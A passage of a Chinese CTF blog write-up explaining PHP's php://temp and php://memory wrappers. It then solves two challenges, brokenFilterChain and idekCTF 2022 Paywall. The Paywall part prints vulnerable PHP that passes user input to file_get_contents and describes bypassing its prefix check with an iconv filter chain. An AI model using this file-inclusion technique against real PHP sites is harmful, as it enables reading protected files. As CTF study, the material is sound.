+<h1 id="php-x2F-x2F-temp"><a href="#php-x2F-x2F-temp" class="headerlink" title="php:&#x2F;&#x2F;temp"></a>php:&#x2F;&#x2F;temp</h1><p>在这里插入一条知识点，就是temp和memory伪协议：<br><code>php://memory </code>和 <code>php://temp </code>是一个类似文件 包装器的数据流，允许读写临时数据。 两者的唯一区别是 php:&#x2F;&#x2F;memory 总是把数据储存在内存中， 而 php:&#x2F;&#x2F;temp 会在内存量达到预定义的限制后（默认是 2MB）存入临时文件中。 临时文件位置的决定和 sys_get_temp_dir() 的方式一致<br>php:&#x2F;&#x2F;temp 的内存限制可通过添加 &#x2F;maxmemory:NN 来控制，NN 是以字节为单位、保留在内存的最大数据量，超过则使用临时文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$fiveMBs</span> = <span class="number">5</span> * <span class="number">1024</span> * <span class="number">1024</span>;</span><br><span class="line"><span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;php://temp/maxmemory:<span class="subst">$fiveMBs</span>&quot;</span>, <span class="string">&#x27;r+&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">fputs</span>(<span class="variable">$fp</span>, <span class="string">&quot;hello\n&quot;</span>);</span><br><span class="line"><span class="comment">// 读取写入的数据.</span></span><br><span class="line"><span class="title function_ invoke__">rewind</span>(<span class="variable">$fp</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">stream_get_contents</span>(<span class="variable">$fp</span>);</span><br></pre></td></tr></table></figure>
+<p>php:&#x2F;&#x2F;memory 和 php:&#x2F;&#x2F;temp 是一次性的，比如：stream 流关闭后，就无法再次得到以前的内容了</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;php://memory&#x27;</span>, <span class="string">&#x27;PHP&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://memory&#x27;</span>); <span class="comment">// 啥也没有</span></span><br></pre></td></tr></table></figure>
+<h1 id="NssCTF-brokenFilterChain"><a href="#NssCTF-brokenFilterChain" class="headerlink" title="NssCTF - brokenFilterChain"></a>NssCTF - brokenFilterChain</h1><p>Attachment：<br><a target="_blank" rel="noopener" href="https://www.yuque.com/attachments/yuque/0/2023/php/32634994/1674918290184-9b9e2c15-d3c1-48d3-956c-354fac3d883c.php?_lake_card=%7B%22src%22:%22https://www.yuque.com/attachments/yuque/0/2023/php/32634994/1674918290184-9b9e2c15-d3c1-48d3-956c-354fac3d883c.php%22,%22name%22:%22brokenFilterChain.php%22,%22size%22:6144,%22ext%22:%22php%22,%22source%22:%22%22,%22status%22:%22done%22,%22download%22:true,%22taskId%22:%22u6fd2bc73-7b97-4afe-bcc5-5903ca5ad7e%22,%22taskType%22:%22upload%22,%22type%22:%22%22,%22__spacing%22:%22both%22,%22mode%22:%22title%22,%22id%22:%22u4fb7915b%22,%22margin%22:%7B%22top%22:true,%22bottom%22:true%7D,%22card%22:%22file%22%7D">brokenFilterChain.php</a><br>这里的附件就是一个filterchain链：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1674918312516-3a9f0dc4-7843-4aff-8bc1-8f10c15c6a2c.png#averageHue=%23fefefe&clientId=u3b02fee0-ef82-4&from=paste&height=495&id=u063c6fee&name=image.png&originHeight=619&originWidth=1905&originalType=binary&ratio=1&rotation=0&showTitle=false&size=100803&status=done&style=none&taskId=u466325c9-4c14-4b42-857a-d60aa33416f&title=&width=1524" alt="image.png"><br>运行过后会发现乱码问题，这也就是上述例子中所说的补齐问题，由于文件内容长度不是3的倍数，会导致出现乱码等问题，因此我们把过滤器中最后一个convert.base64-decode去掉得到<br><code>NssssCTFeyAgphhpRmlsdGVyQ2hhMW5fW4sS0FunICB9GyQp</code><br>分组过后：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Nsss sCTF eyAg phhp Rmls dGVy Q2hh MW5f W4sS <span class="number">0</span>Fun ICB9GyQp</span><br></pre></td></tr></table></figure>
+<p> 对照：<br><code>eyAg</code>——<code>&#123; </code><br><code>RmlsdGVyQ2hhMW5f</code>——<code>FilterCha1n_</code><br><code>ICB9G</code>—— <code>&#125;</code><br>过滤合法字符的base64串：<br><code>Nsss sCTF phhp W4sS 0Fun</code><br>拼接得到flag：<br><code>NssssCTF&#123;phhpFilterCha1n_W4sS0Fun&#125;</code></p>
+<h1 id="idekCTF-2022-Paywall"><a href="#idekCTF-2022-Paywall" class="headerlink" title="[idekCTF 2022]Paywall"></a>[idekCTF 2022]Paywall</h1><p>这里直接放核心代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">       <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">       <span class="title function_ invoke__">set_include_path</span>(<span class="string">&#x27;articles/&#x27;</span>);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>])) &#123;</span><br><span class="line">           <span class="variable">$article_content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>], <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">           <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$article_content</span>, <span class="string">&#x27;PREMIUM&#x27;</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">               <span class="keyword">die</span>(<span class="string">&#x27;Thank you for your interest in The idek Times, but this article is only for premium users!&#x27;</span>); <span class="comment">// <span class="doctag">TODO:</span> implement subscriptions</span></span><br><span class="line">           &#125;</span><br><span class="line">           <span class="keyword">else</span> <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$article_content</span>, <span class="string">&#x27;FREE&#x27;</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">               <span class="keyword">echo</span> <span class="string">&quot;&lt;article&gt;<span class="subst">$article_content</span>&lt;/article&gt;&quot;</span>;</span><br><span class="line">               <span class="keyword">die</span>();</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="keyword">die</span>(<span class="string">&#x27;nothing here&#x27;</span>);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">          </span><br><span class="line">   <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>在index.php有2个跳转界面：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1674917550328-c77c2274-c20b-4e88-9509-be71c7152226.png#averageHue=%23fefefe&clientId=u3b02fee0-ef82-4&from=paste&height=349&id=u41492ba8&name=image.png&originHeight=436&originWidth=912&originalType=binary&ratio=1&rotation=0&showTitle=false&size=19621&status=done&style=none&taskId=u9c0a4f5d-ba11-4cac-849e-53f2c860331&title=&width=729.6" alt="image.png"><br>其中flag对应的就是flag文件，上述核心代码很简单，文件必须是以<code>FREE</code>开头，不能以<code>PREMIUM</code>开头，当我们访问flag文件时，返回的是<code>Thank you for your interest in The idek Times, but this article is only for premium users!</code>说明flag是以<code>PREMIUM</code>开头的，这里我们就可以利用filterchain，把FREE拼在前面，这里需要注意<code>FREE</code>的BASE64编码为：<code>RlJFRQ==</code>,FREE是四个字节，不是3的倍数，因此会出现等号<br>由于存在过滤器<code>iconv.UTF-8.UTF-7</code>过滤器存在，因此等号会被抹除：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1674917819813-0115f317-3acc-49ff-9809-082aefb79782.png#averageHue=%2320252f&clientId=u3b02fee0-ef82-4&from=paste&height=65&id=u39050c6e&name=image.png&originHeight=81&originWidth=344&originalType=binary&ratio=1&rotation=0&showTitle=false&size=11647&status=done&style=none&taskId=u893063be-78d2-4bc8-b95c-e4ae5e93480&title=&width=275.2" alt="image.png">（这里flag的内容就是FREE的base64编码)<br>因此我们需要补齐为3的倍数，也就是添加一个<code>FREEbb</code>到最前面即可</p>
+<p>嗯就在我写到这里的时候我发现一个天大的笑话，Windows没有iconv字符集，因此我fuzz那么久都在打水漂，我是傻逼对不起，放到linux就好了，光速生成：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1674918045327-7083ad3e-5444-49ba-80a9-0c416ff4e290.png#averageHue=%23292b31&clientId=u3b02fee0-ef82-4&from=paste&height=546&id=u5c06d05d&name=image.png&originHeight=683&originWidth=1357&originalType=binary&ratio=1&rotation=0&showTitle=false&size=425548&status=done&style=none&taskId=u3a4a8563-227a-4cfe-b539-5fc122ae188&title=&width=1085.6" alt="image.png"></p>
+<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>Filterchain和命令执行中的异或RCE以及CBC字节翻转有着异曲同工之妙，也就是这些小tips让我成功的对ctf上瘾了(bushi)<br>这是在打一个比赛的时候看到的tips，通过这次学习也是认识到了想象力是无穷的，总会有一些有趣的tips让你着迷</p>
+
+    </div>
+
+    
+    <div class="about">
+        <h1>About this Post</h1>
+        <div class="details">
+            <p>This post is written by Boogipop, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
+        </div>
+        
+        <p class="tags">
+            
+            <i class="icon"></i>
+            <a href="/tags/CTF/" class="tag">#CTF</a><a href="/tags/文件包含/" class="tag">#文件包含</a><a href="/tags/伪协议/" class="tag">#伪协议</a>
+        </p>
+        
+    </div>
+    
+
+    <div class="container post-prev-next">
+        
+        <a href="/2023/03/02/PHP%20GC%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6%E5%8F%8A%E5%88%A9%E7%94%A8/" class="next">
+            <div>
+                <div class="text">
+                    <p class="label">Next</p>
+                    <h3 class="title">PHP GC回收机制及其利用</h3>
+                </div>
+            </div>
+        </a>
+        
+        
+        <a href="/2023/03/02/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/" class="prev">
+            <div>
+                <div class="text">
+                    <p class="label">Previous</p>
+                    <h3 class="title">Tomcat内存马分析</>
+                </div>
+            </div>
+        </a>
+        
+    </div>
+
+    
+        
+        
+        <script src="https://giscus.app/client.js" data-repo="Boogipop/Boogipop.github.io" data-repo-id="R_kgDOIFi78g" data-category="Announcements" data-category-id="DIC_kwDOIFi78s4Cav9f" data-mapping="pathname" data-strict="1" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>
+        
+    
+</article>
+
+        <footer>
+    <div class="inner">
+        <div class="links">
+            
+            <div class="group">
+                <h2 class="title">Blog</h2>
+                
+                <a href="/" class="item">Blog</a>
+                
+                <a href="/archives" class="item">Archives</a>
+                
+                <a href="/tags" class="item">Tags</a>
+                
+                <a href="/categories" class="item">Categories</a>
+                
+                <a href="/search" class="item">Search</a>
+                
+                <a href="/friends" class="item">Friends</a>
+                
+                <a href="/about" class="item">About</a>
+                
+                <a href="/atom.xml" class="item">RSS</a>
+                
+            </div>
+            
+            <div class="group">
+                <h2 class="title">Projects</h2>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/rsa-cli" class="item">RSA CLI</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/a-calendar" class="item">A Calendar</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/auto-mirroring-bucket" class="item">Auto Mirroring Bucket</a>
+                
+            </div>
+            
+            <div class="group">
+                <h2 class="title">Me</h2>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
+                
+                <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
+                
+                <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
+                
+                <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
+                
+                <a target="_blank" rel="noopener" href="https://discord.gg/UKuFDjcfY8" class="item">Discord</a>
+                
+                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
+                
+            </div>
+            
+        </div>
+        <span>&copy; 2024 Boogipop<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
+        
+        
+            <br>
+            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
+                <label>
+                    <input type="radio" value="light">
+                    <span>Light</span>
+                </label>
+                <label>
+                    <input type="radio" value="dark">
+                    <span>Dark</span>
+                </label>
+                <label>
+                    <input type="radio" value="auto">
+                    <span>Auto</span>
+                </label>
+            </div>
+        
+    </div>
+</footer>
+
+
+        
+<script src="/js/main.js"></script>
+
+        
+        
+        
+
+        
+        <script src="https://unpkg.com/scrollreveal"></script>
+		
+        <script>
+            window.addEventListener('load', () => {
+                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
+                ScrollReveal().reveal('.post-list-item .cover-img img')
+                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
+            })
+        </script>
+        
+    </body>
+</html>
